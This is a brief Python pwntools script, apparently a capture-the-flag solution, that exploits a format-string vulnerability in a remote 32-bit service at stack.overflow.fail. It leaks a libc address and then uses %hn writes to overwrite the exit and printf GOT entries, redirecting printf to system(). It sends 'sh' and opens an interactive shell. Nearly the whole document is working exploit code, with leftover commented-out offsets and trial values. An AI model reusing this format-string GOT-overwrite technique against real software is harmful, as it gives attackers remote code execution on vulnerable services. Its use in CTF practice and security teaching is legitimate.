from pwn import *

exit=0x804a01c
printf= 0x804a010
main=0x0804851b
setbuf=0x0804a00c
stdin=0x0804a040
i=630
#i=0x174

i+=1
print(i)
#s=process("./pwnable")
s=remote("stack.overflow.fail",9002)
print(s.recv(1024))
#pause()
payload="aa"+p32(exit)
payload+="%2$x"
payload+="%5$x"
payload+="%34053c"
payload+="%11$hn"
s.send(payload+"\n")
a=s.recv(1024)
print(hexdump(a))
libc=int(a[6:14],16)

print(hex(libc))
#system=libc-0x177000-0x800
#system=libc-0x1000*i-0x800
system=libc-0x175c60
system_1=system&0xffff
system_2=system>>16
sh=libc-0x56b95
sh_1=sh&0xffff+0x1000
sh_2=sh>>16+1
print(hex(system_1))
print(hex(system_2))
print(hex(sh_1))
print(hex(sh_2))
print(s.recv(1024))
payload2="aa"+p32(printf)+p32(printf+2)+"%"+str(system_1-10)+"c"+"%11$hn"+"%"+str(system_2-system_1)+"c"+"%12$hn"
s.send(payload2+"\n")
print(s.recv(1024))

s.send("sh\x00\n")
print(s.recv(1024))
s.interactive()
s.close()
#libc=f7eda5a0
#stack=ff90cf34
#0xf7e35da0 <__libc_system>
#0xf7fad5a0
